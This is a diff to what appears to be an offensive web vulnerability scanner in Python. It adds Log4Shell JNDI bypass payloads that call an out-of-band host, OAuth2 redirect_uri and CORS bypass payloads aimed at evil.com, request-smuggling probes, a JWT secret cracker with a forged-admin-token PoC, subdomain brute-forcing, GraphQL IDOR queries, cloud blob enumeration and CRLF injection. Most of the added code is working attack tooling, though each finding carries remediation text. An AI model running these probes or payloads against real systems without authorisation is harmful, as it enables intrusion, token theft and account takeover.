@@ -174,7 +174,8 @@ WORDLIST_JWT_SECRETS = [
 @dataclass
 class Finding:
     id: str; title: str; severity: str; cwe: str; cvss: float
-    description: str; evidence: str; reproduction: str; poc_curl: str
+    description: str; poc_curl: str
+    evidence: str = ""; reproduction: str = ""
     burp_request: str = ""; category: str = ""; remediation: str = ""
 
 @dataclass
@@ -219,6 +220,10 @@ class Config:
     user_agent: str = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
     ua_bot: str = "Googlebot/2.1 (+http://www.google.com/bot.html)"
 
+    @property
+    def ua(self) -> str:
+        return self.user_agent
+
 # ══════════════════════════════════════════════════════════════
 # HTTP HELPERS
 # ══════════════════════════════════════════════════════════════
@@ -227,28 +232,41 @@ def _ssl_ctx():
     ctx.check_hostname = False
     return ctx
 
+class _Resp(tuple):
+    """Backward-compatible fetch result: unpack as (status, body_str, headers)
+    OR access as .status / .body (bytes) / .headers for Phase 9-14 tools."""
+    __slots__ = ()
+    @property
+    def status(self):  return self[0]
+    @property
+    def body(self):    return self[1].encode("utf-8") if self[1] else b""
+    @property
+    def headers(self): return self[2]
+    def __bool__(self):return self[0] != 0
+
 def _fetch(url: str, ua: str, timeout: int, method: str = "GET",
            data: bytes = None, headers_extra: Dict = None,
-           return_headers: bool = False) -> Tuple[int, str, Dict]:
+           extra_headers: Dict = None,
+           return_headers: bool = False) -> "_Resp":
     try:
         h = {"User-Agent": ua, "Accept": "text/html,application/json,*/*",
              "Accept-Language": "ar,en-US;q=0.7,en;q=0.3"}
-        if headers_extra:
-            h.update(headers_extra)
+        if headers_extra:  h.update(headers_extra)
+        if extra_headers:  h.update(extra_headers)
         req = urllib.request.Request(url, data=data, headers=h, method=method)
         with urllib.request.urlopen(req, timeout=timeout, context=_ssl_ctx()) as r:
             body = r.read(2_000_000).decode("utf-8", errors="replace")
             hdrs = {k.lower(): v for k, v in r.headers.items()}
-            return r.status, body, hdrs
+            return _Resp((r.status, body, hdrs))
     except urllib.error.HTTPError as e:
         try:
             body = e.read(5000).decode("utf-8", errors="replace")
         except Exception:
             body = ""
         hdrs = {k.lower(): v for k, v in e.headers.items()}
-        return e.code, body, hdrs
+        return _Resp((e.code, body, hdrs))
     except Exception:
-        return 0, "", {}
+        return _Resp((0, "", {}))
 
 def _head(url: str, ua: str, timeout: int, headers_extra: Dict = None) -> Tuple[int, Dict]:
     code, _, hdrs = _fetch(url, ua, timeout, method="HEAD", headers_extra=headers_extra)
@@ -751,7 +769,7 @@ class SecretScanner:
         "Twilio SID":       (r"AC[0-9a-fA-F]{32}", 3.5),
         "Salesforce Token": (r"(?i)salesforce.{0,20}['\"][0-9a-zA-Z._\-]{30,}['\"]", 2.5),
         "Freshdesk Key":    (r"(?i)freshdesk.{0,10}['\"][0-9a-zA-Z_\-]{20,}['\"]", 2.5),
-        "Debug Info":       (r"(?i)(stack trace|exception|debug|traceback|error at line)", 1.0),
+        "Debug Info":       (r"(?i)(stack trace at .{10,}|traceback \(most recent|error at line \d)", 3.5),
         "npm Token":        (r"npm_[a-zA-Z0-9]{36}", 4.0),
         "PyPI Token":       (r"pypi-[a-zA-Z0-9\-_]{100,}", 4.0),
     }
@@ -10706,26 +10724,18 @@ class Log4ShellFollowOn:
     """Detect Log4Shell follow-on CVEs: Log4j2 JNDI bypass, CVE-2021-45046, Log4j 2.17.x."""
     NAME = "Log4Shell Follow-On Detector"
     OOB = "YOUR_OOB_DOMAIN.burpcollaborator.net"
+    # Templates use __HOST__ / __OOB__ placeholders (not .format braces)
+    # to avoid KeyError when Python sees ${jndi:...} as a format field.
     BYPASS_PAYLOADS = [
-        # CVE-2021-44228 basic
-        "${jndi:ldap://basic.{host}.{oob}/a}",
-        # CVE-2021-45046 - context lookup bypass
-        "${${lower:j}ndi:${lower:l}dap://cve45046.{host}.{oob}/a}",
-        # Obfuscation bypass
-        "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://obfs.{host}.{oob}/a}",
-        # Upper/lower mix
-        "${${upper:j}ndi:${upper:l}dap://upper.{host}.{oob}/a}",
-        # DNS via RMI
-        "${jndi:rmi://rmi.{host}.{oob}/a}",
-        # DNS via IIOP
-        "${jndi:iiop://iiop.{host}.{oob}/a}",
-        # DNS via DNS itself
-        "${jndi:dns://dns.{host}.{oob}/a}",
-        # Nested lookup
-        "${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//nested.{host}.{oob}/a}",
-        # Log4j 2.14.1 env lookup
+        "${jndi:ldap://basic.__HOST__.__OOB__/a}",
+        "${${lower:j}ndi:${lower:l}dap://cve45046.__HOST__.__OOB__/a}",
+        "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://obfs.__HOST__.__OOB__/a}",
+        "${${upper:j}ndi:${upper:l}dap://upper.__HOST__.__OOB__/a}",
+        "${jndi:rmi://rmi.__HOST__.__OOB__/a}",
+        "${jndi:iiop://iiop.__HOST__.__OOB__/a}",
+        "${jndi:dns://dns.__HOST__.__OOB__/a}",
+        "${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//nested.__HOST__.__OOB__/a}",
         "${env:HOSTNAME}",
-        # Spring Boot banner leak
         "${spring:application.name}",
     ]
     INJECT_HEADERS = [
@@ -10741,7 +10751,7 @@ class Log4ShellFollowOn:
         host = profile.host
         oob = self.OOB
         for payload_tmpl in self.BYPASS_PAYLOADS[:6]:
-            payload = payload_tmpl.format(host=host, oob=oob)
+            payload = payload_tmpl.replace("__HOST__", host).replace("__OOB__", oob)
             for header in self.INJECT_HEADERS[:5]:
                 try:
                     r = _fetch(base + "/", cfg.ua, cfg.timeout,
@@ -10773,7 +10783,7 @@ class Log4ShellFollowOn:
         # Generate OOB payloads for all headers
         all_payloads = []
         for hdr in self.INJECT_HEADERS[:6]:
-            payload = self.BYPASS_PAYLOADS[0].format(host=host, oob=oob)
+            payload = self.BYPASS_PAYLOADS[0].replace("__HOST__", host).replace("__OOB__", oob)
             all_payloads.append(
                 f"curl -sk '{base}/' -H '{hdr}: {payload}'"
             )
@@ -12941,6 +12951,957 @@ class BinaryFileAnalyzer:
         return profile
 
 # ══════════════════════════════════════════════════════════════
+# TOOLS 341-360 — 20 Black Team Skills (Phase 15)
+# ══════════════════════════════════════════════════════════════
+
+class OAuth2TokenHijack:
+    """Detect OAuth2 token interception: redirect_uri bypass, fragment leakage, state fixation."""
+    NAME = "OAuth2 Token Hijack"
+    AUTH_PATHS = ["/oauth/authorize", "/oauth2/authorize", "/auth/authorize",
+                  "/connect/authorize", "/v1/oauth/authorize",
+                  "/realms/master/protocol/openid-connect/auth",
+                  "/oauth2/default/v1/authorize"]
+    BYPASS_REDIRECT = [
+        "https://evil.com", "https://evil.com%2F@{host}", "https://{host}.evil.com",
+        "https://{host}%0d%0aLocation:https://evil.com", "javascript:alert(1)",
+        "//evil.com", "https://evil.com?{host}", "https://good.com.evil.com",
+        "https://{host}/../evil.com",
+    ]
+
+    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
+        import urllib.parse
+        base = profile.url.rstrip("/")
+        host = profile.host
+        for path in self.AUTH_PATHS:
+            url = base + path
+            try:
+                r = _fetch(url, cfg.ua, cfg.timeout)
+                if r and r.status in (200, 302, 400):
+                    body = (r.body or b"").decode("utf-8", errors="replace")
+                    if any(s in body for s in ["client_id", "response_type",
+                                               "redirect_uri", "scope", "state"]):
+                        for redir in self.BYPASS_REDIRECT[:4]:
+                            redir_filled = redir.replace("{host}", host)
+                            test_url = (f"{url}?response_type=token&client_id=test"
+                                        f"&redirect_uri={urllib.parse.quote(redir_filled)}"
+                                        f"&scope=openid&state=FIXEDSTATE")
+                            try:
+                                r2 = _fetch(test_url, cfg.ua, cfg.timeout)
+                                loc = r2.headers.get("location", "")
+                                if r2 and r2.status in (302, 301) and "evil.com" in loc:
+                                    profile.findings.append(Finding(
+                                        id=f"OAUTH2-REDIR-{path.replace('/','_').strip('_')[:14].upper()}",
+                                        title=f"OAuth2 redirect_uri bypass — token hijack at {path}",
+                                        severity="CRITICAL", cvss=9.3, cwe="CWE-601",
+                                        description=(
+                                            f"OAuth2 redirect_uri validation bypass at {path}. "
+                                            f"Malicious redirect '{redir_filled}' accepted — "
+                                            "attacker receives access_token/code in URL fragment."
+                                        ),
+                                        evidence=f"Location: {loc[:200]}",
+                                        poc_curl=f"curl -sk -D- '{test_url}'",
+                                        category="OAuth2 / OIDC",
+                                        remediation="Strict exact-match redirect_uri validation. Reject all wildcard/subdomain/open-redirect URIs. Enforce state parameter CSRF protection. Use PKCE for public clients."
+                                    ))
+                                    break
+                            except Exception:
+                                pass
+            except Exception:
+                pass
+        return profile
+
+
+class HTTPDesyncTeDetector:
+    """Detect TE.0 and CL.0 HTTP request smuggling via differential responses."""
+    NAME = "HTTP Desync TE/CL Detector"
+    DESYNC_PROBES = [
+        # TE.0 — backend ignores TE, frontend uses it
+        ("TE.0", "POST", {
+            "Transfer-Encoding": "chunked",
+            "Content-Length":    "6",
+        }, b"0\r\n\r\nG"),
+        # CL.0 — frontend uses CL, backend ignores it
+        ("CL.0", "POST", {
+            "Content-Length":    "0",
+        }, b"GET /hopefully404 HTTP/1.1\r\nHost: x\r\n\r\n"),
+        # TE obfuscation
+        ("TE-OBF", "POST", {
+            "Transfer-Encoding": "chunked",
+            "Transfer-encoding": "identity",
+            "Content-Length":    "6",
+        }, b"0\r\n\r\nG"),
+        # H2.TE hint via upgrade header
+        ("H2-UPGRADE", "GET", {
+            "Upgrade":    "h2c",
+            "Connection": "Upgrade, HTTP2-Settings",
+            "HTTP2-Settings": "AAMAAABkAAQAAP__",
+        }, None),
+    ]
+
+    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
+        base = profile.url.rstrip("/")
+        for label, method, hdrs, body in self.DESYNC_PROBES:
+            try:
+                t0 = time.time()
+                r = _fetch(base + "/", cfg.ua, cfg.timeout + 5,
+                           method=method, data=body, extra_headers=hdrs)
+                elapsed = time.time() - t0
+                if r and (elapsed > 4.5 or r.status in (400, 500, 501)):
+                    body_resp = (r.body or b"").decode("utf-8", errors="replace")
+                    likely = elapsed > 4.5 or "invalid" in body_resp.lower()
+                    if likely:
+                        profile.findings.append(Finding(
+                            id=f"DESYNC-{label}-001",
+                            title=f"HTTP Request Smuggling Surface — {label} probe",
+                            severity="HIGH", cvss=8.1, cwe="CWE-444",
+                            description=(
+                                f"Desync probe {label} returned HTTP {r.status} in {elapsed:.1f}s. "
+                                "Indicates possible CL/TE disagreement between frontend proxy "
+                                "and backend — enables request smuggling, session hijacking, "
+                                "cache poisoning, and WAF bypass."
+                            ),
+                            evidence=f"HTTP {r.status} | elapsed={elapsed:.2f}s | body={body_resp[:150]}",
+                            poc_curl=(
+                                f"# {label} smuggling probe:\n"
+                                f"curl -sk -X POST '{base}/' "
+                                + " ".join(f"-H '{k}: {v}'" for k, v in hdrs.items())
+                                + (f" -d $'{''.join(repr(c)[1:-1] for c in body.decode('latin1', errors='replace')[:20])}'" if body else "")
+                            ),
+                            category="HTTP Smuggling",
+                            remediation="Normalize CL and TE headers at the reverse proxy. Reject ambiguous requests. Use HTTP/2 end-to-end. Disable Transfer-Encoding for HTTP/1.1 backends."
+                        ))
+            except Exception:
+                pass
+        return profile
+
+
+class JWTSecretCracker:
+    """Brute-force weak JWT HMAC secrets using common wordlists."""
+    NAME = "JWT Secret Cracker"
+    WEAK_SECRETS = [
+        "secret", "password", "123456", "admin", "test", "key",
+        "jwt_secret", "your-256-bit-secret", "change-me", "supersecret",
+        "token_secret", "app_secret", "flask_secret", "django-insecure",
+        "development", "staging", "production", "mysecretkey",
+        "HS256key", "jwt-key", "auth_secret", "api_secret",
+        "", "null", "undefined", "none", "true", "false",
+        profile_host := None,  # placeholder — filled at runtime
+    ]
+
+    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
+        import base64, hmac, hashlib
+        secrets_to_try = [s for s in self.WEAK_SECRETS if s is not None]
+        secrets_to_try += [profile.host, profile.apex, profile.host.split(".")[0]]
+        jwts = [f.evidence for f in profile.findings if "JWT" in f.id or "jwt" in f.id.lower()]
+        jwts += [s.get("value", "") for s in profile.secrets if "eyJ" in s.get("value", "")]
+        for raw_jwt in jwts[:5]:
+            raw_jwt = raw_jwt.strip().strip('"\'')
+            parts = raw_jwt.split(".")
+            if len(parts) != 3:
+                continue
+            header_payload = f"{parts[0]}.{parts[1]}"
+            sig_b64 = parts[2]
+            for secret in secrets_to_try:
+                try:
+                    sig = hmac.new(secret.encode(), header_payload.encode(), hashlib.sha256).digest()
+                    sig_b64_check = base64.urlsafe_b64encode(sig).rstrip(b"=").decode()
+                    if sig_b64_check == sig_b64:
+                        profile.findings.append(Finding(
+                            id=f"JWT-CRACK-WEAK-SECRET",
+                            title=f"JWT HMAC Secret Cracked: '{secret}'",
+                            severity="CRITICAL", cvss=9.8, cwe="CWE-326",
+                            description=(
+                                f"JWT HMAC-SHA256 secret is weak: '{secret}'. "
+                                "Attacker can forge any token — impersonate any user, "
+                                "escalate to admin, bypass all JWT-protected endpoints."
+                            ),
+                            evidence=f"JWT: {raw_jwt[:60]}... | Secret: {secret}",
+                            poc_curl=(
+                                f"# Forge admin JWT with python-jwt or jwt.io:\n"
+                                f"python3 -c \""
+                                f"import jwt; print(jwt.encode({{'sub':'admin','role':'admin'}}, '{secret}', algorithm='HS256'))"
+                                f"\""
+                            ),
+                            category="JWT",
+                            remediation=f"Replace weak secret '{secret}' with ≥256-bit cryptographically random value. Use RS256 (asymmetric) for JWTs. Rotate all tokens immediately."
+                        ))
+                        break
+                except Exception:
+                    pass
+        return profile
+
+
+class ReconSubdomainBrute:
+    """Brute-force subdomains via raw DNS UDP against common wordlist."""
+    NAME = "Subdomain Brute DNS"
+    WORDLIST = [
+        "api", "app", "admin", "dev", "stage", "staging", "test", "beta",
+        "prod", "production", "secure", "vpn", "mail", "smtp", "ftp",
+        "ssh", "git", "gitlab", "jenkins", "ci", "cd", "jira", "confluence",
+        "wiki", "docs", "support", "help", "portal", "dashboard", "panel",
+        "monitor", "metrics", "grafana", "kibana", "elastic", "redis",
+        "db", "database", "mysql", "postgres", "mongo", "rabbit", "kafka",
+        "auth", "login", "oauth", "sso", "iam", "idp", "accounts",
+        "mobile", "api2", "v1", "v2", "v3", "internal", "private",
+        "corporate", "intranet", "remote", "cloud", "aws", "azure",
+        "backup", "archive", "old", "new", "legacy", "preview",
+        "sandbox", "uat", "qa", "static", "assets", "cdn", "media",
+        "img", "images", "files", "upload", "uploads", "download",
+    ]
+
+    def _dns_lookup(self, hostname: str) -> str:
+        import socket
+        try:
+            return socket.gethostbyname(hostname)
+        except Exception:
+            return ""
+
+    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
+        apex = profile.apex
+        new_subs = []
+        for word in self.WORDLIST:
+            fqdn = f"{word}.{apex}"
+            if fqdn in profile.subdomains:
+                continue
+            ip = self._dns_lookup(fqdn)
+            if ip:
+                new_subs.append((fqdn, ip))
+                profile.subdomains.append(fqdn)
+        if new_subs:
+            profile.findings.append(Finding(
+                id="RECON-SUBDOMAIN-BRUTE-001",
+                title=f"Subdomain Brute — {len(new_subs)} new subdomains discovered",
+                severity="INFO", cvss=0.0, cwe="CWE-200",
+                description=(
+                    f"DNS brute-force discovered {len(new_subs)} additional subdomains for {apex}. "
+                    "Each represents additional attack surface."
+                ),
+                evidence="\n".join(f"  {fqdn} → {ip}" for fqdn, ip in new_subs[:20]),
+                poc_curl="\n".join(f"curl -sk 'https://{fqdn}/'" for fqdn, _ in new_subs[:5]),
+                category="Reconnaissance",
+                remediation="Review each discovered subdomain for security posture. Remove unused subdomains. Apply consistent security headers and authentication across all subdomains."
+            ))
+        return profile
+
+
+class GraphQLIDORDetector:
+    """Detect IDOR via GraphQL — enumerate IDs in queries and test object-level auth."""
+    NAME = "GraphQL IDOR Detector"
+    GQL_ENDPOINTS = ["/graphql", "/api/graphql", "/v1/graphql", "/query", "/gql"]
+    ID_QUERIES = [
+        ('{"query":"{user(id:\\"2\\"){id email role}}"}',            "User ID 2"),
+        ('{"query":"{order(id:\\"1\\"){id total items}}"}',           "Order ID 1"),
+        ('{"query":"{profile(userId:\\"2\\"){id email phone}}"}',     "Profile ID 2"),
+        ('{"query":"{invoice(id:\\"1\\"){id amount customerName}}"}', "Invoice ID 1"),
+        ('{"query":"{ticket(id:\\"1\\"){id status assignee secret}}"}', "Ticket ID 1"),
+        ('{"query":"{ __schema { queryType { name } mutationType { name } } }"}', "Schema introspection"),
+        ('{"query":"{users{id email role isAdmin}}"}',                "All users list"),
+        ('{"query":"{admin{users{id email password}}}"}',             "Admin users dump"),
+    ]
+
+    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
+        base = profile.url.rstrip("/")
+        for ep in self.GQL_ENDPOINTS:
+            url = base + ep
+            for query_body, label in self.ID_QUERIES:
+                try:
+                    r = _fetch(url, cfg.ua, cfg.timeout, "POST",
+                               query_body.encode(),
+                               {"Content-Type": "application/json"})
+                    if r and r.status == 200:
+                        body = (r.body or b"").decode("utf-8", errors="replace")
+                        if '"data"' in body and '"errors"' not in body:
+                            has_sensitive = any(s in body for s in [
+                                '"email"', '"password"', '"role"', '"isAdmin"',
+                                '"phone"', '"secret"', '"token"', '"key"',
+                                '"amount"', '"total"', '"customerName"',
+                            ])
+                            profile.findings.append(Finding(
+                                id=f"GQL-IDOR-{label.replace(' ','_').upper()[:18]}",
+                                title=f"GraphQL IDOR / Unauth Data Access — {label}",
+                                severity="CRITICAL" if has_sensitive else "HIGH",
+                                cvss=9.1 if has_sensitive else 7.5,
+                                cwe="CWE-639",
+                                description=(
+                                    f"GraphQL query '{label}' returned data at {ep} without "
+                                    "user-specific authorization. "
+                                    + ("Sensitive fields exposed: email/password/role detected."
+                                       if has_sensitive else "Object-level auth not enforced.")
+                                ),
+                                evidence=body[:300],
+                                poc_curl=(
+                                    f"curl -sk -X POST '{url}' "
+                                    f"-H 'Content-Type: application/json' "
+                                    f"-d '{query_body}'"
+                                ),
+                                category="GraphQL IDOR",
+                                remediation="Implement per-field authorization in GraphQL resolvers. Use DataLoader with ownership checks. Apply depth/complexity limits. Disable introspection in production."
+                            ))
+                except Exception:
+                    pass
+        return profile
+
+
+class CORSWildcardChain:
+    """Detect CORS wildcard + credentials, trusted subdomain chains, and origin reflection."""
+    NAME = "CORS Wildcard Chain"
+    ORIGIN_TESTS = [
+        ("null",                     "null origin"),
+        ("https://evil.com",         "arbitrary origin"),
+        ("https://{apex}.evil.com",  "apex suffix bypass"),
+        ("https://evil.{apex}",      "subdomain prefix bypass"),
+        ("https://sub.{apex}",       "trusted subdomain"),
+        ("https://{apex}_.evil.com", "underscore bypass"),
+        ("http://{apex}",            "HTTP downgrade"),
+        ("https://{apex}:443",       "port variation"),
+    ]
+
+    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
+        base = profile.url.rstrip("/")
+        apex = profile.apex
+        for origin_tmpl, label in self.ORIGIN_TESTS:
+            origin = origin_tmpl.replace("{apex}", apex)
+            try:
+                r = _fetch(base + "/api/", cfg.ua, cfg.timeout,
+                           extra_headers={"Origin": origin})
+                if r:
+                    acao = r.headers.get("access-control-allow-origin", "")
+                    acac = r.headers.get("access-control-allow-credentials", "")
+                    if acao and (acao == origin or acao == "*"):
+                        sev = "CRITICAL" if acac.lower() == "true" else "HIGH"
+                        profile.findings.append(Finding(
+                            id=f"CORS-CHAIN-{label.replace(' ','_').upper()[:18]}",
+                            title=f"CORS Misconfiguration — {label} accepted with credentials={acac or 'N/A'}",
+                            severity=sev, cvss=9.0 if sev == "CRITICAL" else 7.4, cwe="CWE-346",
+                            description=(
+                                f"CORS allows origin '{origin}' with "
+                                f"Access-Control-Allow-Credentials: {acac or 'not set'}. "
+                                "Enables cross-origin credential theft: authenticated requests "
+                                "from attacker-controlled page to read victim's data."
+                            ),
+                            evidence=f"ACAO: {acao} | ACAC: {acac}",
+                            poc_curl=(
+                                f"curl -sk '{base}/api/' -H 'Origin: {origin}' -v 2>&1 | "
+                                f"grep -i 'access-control'"
+                            ),
+                            category="CORS",
+                            remediation="Use strict allowlist for CORS origins. Never combine wildcard ACAO with credentials. Validate full origin (scheme+host+port). Reject null origin."
+                        ))
+            except Exception:
+                pass
+        return profile
+
+
+class OpenAPIFuzzer:
+    """Fuzz discovered OpenAPI/Swagger schemas for hidden parameters and undocumented endpoints."""
+    NAME = "OpenAPI Fuzzer"
+    SPEC_PATHS = ["/swagger.json", "/openapi.json", "/openapi.yaml",
+                  "/api-docs", "/v2/api-docs", "/v3/api-docs",
+                  "/swagger/v1/swagger.json", "/api/swagger.json"]
+    HIDDEN_PARAMS = ["debug", "internal", "admin", "test", "bypass",
+                     "_method", "_token", "X-Admin", "sudo", "root",
+                     "role", "isAdmin", "force", "override", "raw"]
+
+    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
+        import re
+        base = profile.url.rstrip("/")
+        spec = None
+        spec_url = None
+        for path in self.SPEC_PATHS:
+            url = base + path
+            try:
+                r = _fetch(url, cfg.ua, cfg.timeout)
+                if r and r.status == 200:
+                    body = (r.body or b"").decode("utf-8", errors="replace")
+                    if '"paths"' in body or "openapi:" in body or '"swagger"' in body:
+                        spec = body; spec_url = url; break
+            except Exception:
+                pass
+        if not spec:
+            return profile
+        # Extract all endpoints from spec
+        endpoints = re.findall(r'"(/[^"]+)":\s*\{', spec)
+        if endpoints:
+            profile.findings.append(Finding(
+                id="OPENAPI-SCHEMA-001",
+                title=f"OpenAPI Schema Exposed — {len(endpoints)} endpoints enumerated",
+                severity="HIGH", cvss=7.5, cwe="CWE-200",
+                description=(
+                    f"OpenAPI/Swagger schema at {spec_url} exposes full API surface: "
+                    f"{len(endpoints)} endpoints, request schemas, and response models. "
+                    "Enables targeted fuzzing of all parameters."
+                ),
+                evidence=f"Endpoints: {', '.join(endpoints[:10])}{'...' if len(endpoints)>10 else ''}",
+                poc_curl=f"curl -sk '{spec_url}' | python3 -m json.tool | grep '\"/' | head -30",
+                category="API Schema",
+                remediation="Restrict Swagger/OpenAPI to authenticated users only. Disable in production or apply IP allowlist. Remove sensitive schema details (internal service names, DB schemas)."
+            ))
+        # Fuzz first few endpoints with hidden params
+        for ep in endpoints[:5]:
+            url = base + ep
+            for param in self.HIDDEN_PARAMS[:6]:
+                try:
+                    r = _fetch(f"{url}?{param}=1", cfg.ua, cfg.timeout)
+                    if r and r.status in (200, 201):
+                        body = (r.body or b"").decode("utf-8", errors="replace")
+                        if any(s in body for s in ['"admin"', '"debug"', '"internal"',
+                                                    '"sudo"', '"override"', "true"]):
+                            profile.findings.append(Finding(
+                                id=f"OPENAPI-HIDDEN-{param.upper()[:12]}-{ep.replace('/','_')[:10].upper()}",
+                                title=f"Hidden parameter '?{param}' accepted at {ep}",
+                                severity="HIGH", cvss=7.5, cwe="CWE-912",
+                                description=(
+                                    f"Undocumented parameter '?{param}=1' at {ep} returned "
+                                    f"HTTP {r.status} with success indicators. "
+                                    "May enable debug mode, admin access, or behaviour override."
+                                ),
+                                evidence=body[:200],
+                                poc_curl=f"curl -sk '{url}?{param}=1'",
+                                category="Hidden Parameters",
+                                remediation="Audit all accepted parameters against OpenAPI schema. Remove undocumented debug/admin parameters from production builds. Apply input allowlist."
+                            ))
+                except Exception:
+                    pass
+        return profile
+
+
+class AzureBlobPublicDetector:
+    """Enumerate publicly accessible Azure Blob Storage containers by naming pattern."""
+    NAME = "Azure Blob Public Detector"
+    CONTAINER_NAMES = [
+        "public", "assets", "media", "images", "uploads", "files",
+        "static", "backup", "backups", "data", "export", "exports",
+        "documents", "docs", "reports", "logs", "config", "configs",
+        "archive", "archives", "temp", "tmp", "cache", "cdn",
+        "release", "releases", "build", "builds", "dist",
+    ]
+
+    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
+        apex_parts = profile.apex.replace(".", "-")
+        host_part = profile.host.replace(".", "-")
+        storage_accounts = [
+            apex_parts, host_part,
+            apex_parts.split("-")[0],
+            host_part.split("-")[0],
+            f"{apex_parts}prod", f"{apex_parts}dev",
+            f"{apex_parts}storage", f"{host_part}sa",
+        ]
+        for acct in storage_accounts[:4]:
+            for container in self.CONTAINER_NAMES[:10]:
+                url = f"https://{acct}.blob.core.windows.net/{container}?restype=container&comp=list"
+                try:
+                    r = _fetch(url, cfg.ua, cfg.timeout)
+                    if r and r.status == 200:
+                        body = (r.body or b"").decode("utf-8", errors="replace")
+                        if "<EnumerationResults" in body or "<Blobs>" in body:
+                            import re
+                            blobs = re.findall(r"<Name>([^<]+)</Name>", body)
+                            profile.findings.append(Finding(
+                                id=f"AZURE-BLOB-PUBLIC-{acct[:12].upper()}-{container[:8].upper()}",
+                                title=f"Public Azure Blob Container: {acct}/{container}",
+                                severity="HIGH", cvss=7.5, cwe="CWE-284",
+                                description=(
+                                    f"Azure Blob container '{container}' in account '{acct}' is publicly "
+                                    f"listable. Found {len(blobs)} blobs."
+                                ),
+                                evidence=f"Blobs: {', '.join(blobs[:10])}",
+                                poc_curl=f"curl -sk '{url}'",
+                                category="Cloud Storage",
+                                remediation="Set container access to private. Apply Azure Storage firewall. Use SAS tokens with expiry for temporary access. Enable Azure Defender for Storage."
+                            ))
+                except Exception:
+                    pass
+        return profile
+
+
+class SessionFixationDetector:
+    """Detect session fixation — pre-auth token reuse after login."""
+    NAME = "Session Fixation Detector"
+    LOGIN_PATHS = ["/login", "/api/login", "/auth/login", "/signin",
+                   "/api/signin", "/api/auth", "/api/v1/auth/login",
+                   "/api/v2/auth/login", "/account/login", "/user/login"]
+
+    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
+        base = profile.url.rstrip("/")
+        for path in self.LOGIN_PATHS:
+            url = base + path
+            try:
+                # Step 1: get pre-auth session cookie
+                r1 = _fetch(url, cfg.ua, cfg.timeout)
+                if not r1 or r1.status not in (200, 405):
+                    continue
+                pre_cookies = r1.headers.get("set-cookie", "")
+                if not pre_cookies:
+                    continue
+                # Step 2: submit login with that cookie
+                r2 = _fetch(url, cfg.ua, cfg.timeout, "POST",
+                            b'{"username":"test@test.com","password":"test123"}',
+                            {"Content-Type": "application/json",
+                             "Cookie": pre_cookies})
+                if not r2:
+                    continue
+                post_cookies = r2.headers.get("set-cookie", "")
+                # If no new session cookie issued after login → fixation risk
+                if pre_cookies and not post_cookies and r2.status in (200, 201):
+                    profile.findings.append(Finding(
+                        id=f"SESSION-FIXATION-{path.replace('/','_').strip('_')[:16].upper()}",
+                        title=f"Potential Session Fixation at {path}",
+                        severity="HIGH", cvss=7.5, cwe="CWE-384",
+                        description=(
+                            f"Login at {path} did not issue a new session cookie after authentication. "
+                            "Pre-auth session token appears to persist — session fixation attack possible. "
+                            "Attacker sets victim's session ID before login, then hijacks the session."
+                        ),
+                        evidence=f"Pre-auth cookie: {pre_cookies[:80]}\nPost-auth Set-Cookie: (none)",
+                        poc_curl=(
+                            f"# Step 1 — get session:\n"
+                            f"SESSION=$(curl -sk -c - '{url}' | grep -i session)\n"
+                            f"# Step 2 — login with fixed session:\n"
+                            f"curl -sk -X POST '{url}' -H 'Cookie: {pre_cookies[:40]}' "
+                            f"-d '{{\"username\":\"victim\",\"password\":\"correct\"}}'"
+                        ),
+                        category="Session Management",
+                        remediation="Issue a new session ID on every successful authentication. Invalidate pre-auth session tokens. Use SameSite=Strict; Secure; HttpOnly on session cookies."
+                    ))
+            except Exception:
+                pass
+        return profile
+
+
+class HTTPHeaderInjectionAdv:
+    """Detect advanced HTTP header injection: CRLF, cache poisoning via headers, host override."""
+    NAME = "HTTP Header Injection Advanced"
+    CRLF_PAYLOADS = [
+        "%0d%0aSet-Cookie:crlftest=1",
+        "%0aSet-Cookie:crlftest=1",
+        "%0d%0aX-Injected:crlftest",
+        "%0d%0a%0d%0a<html>crlftest</html>",
+        "\r\nSet-Cookie:crlftest=1",
+        "%E5%98%8D%E5%98%8ASet-Cookie:crlftest=1",  # Unicode CRLF bypass
+    ]
+    POISON_HEADERS = [
+        ("X-Forwarded-Host",    "evil.com"),
+        ("X-Original-URL",      "/admin"),
+        ("X-Rewrite-URL",       "/admin"),
+        ("X-Override-URL",      "/admin"),
+        ("X-Forwarded-Prefix",  "/admin"),
+        ("X-Original-Host",     "evil.com"),
+        ("X-Forwarded-Server",  "evil.com"),
+    ]
+
+    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
+        import urllib.parse
+        base = profile.url.rstrip("/")
+        # CRLF via redirect params
+        for payload in self.CRLF_PAYLOADS[:4]:
+            for param in ["next", "return", "redirect", "url", "to", "location"]:
+                url = f"{base}/?{param}={urllib.parse.quote('https://example.com/' + payload)}"
+                try:
+                    r = _fetch(url, cfg.ua, cfg.timeout)
+                    if r:
+                        raw_hdrs = str(r.headers)
+                        if "crlftest" in raw_hdrs.lower():
+                            profile.findings.append(Finding(
+                                id=f"CRLF-INJECT-{param.upper()[:10]}",
+                                title=f"CRLF Injection via ?{param} — HTTP header injection",
+                                severity="HIGH", cvss=7.5, cwe="CWE-113",
+                                description=(
+                                    f"CRLF injection via ?{param} parameter. "
+                                    "Payload injected into HTTP response headers. "
+                                    "Enables: Set-Cookie injection, XSS via header reflection, "
+                                    "cache poisoning, open redirect chaining."
+                                ),
+                                evidence=f"Injected header found in response: {raw_hdrs[:200]}",
+                                poc_curl=f"curl -sk -D- '{url}'",
+                                category="CRLF Injection",
+                                remediation="Sanitise all redirect parameters. Strip CR/LF characters before using values in response headers. Use safe redirect libraries."
+                            ))
+                            break
+                except Exception:
+                    pass
+        # Cache poisoning via unkeyed headers
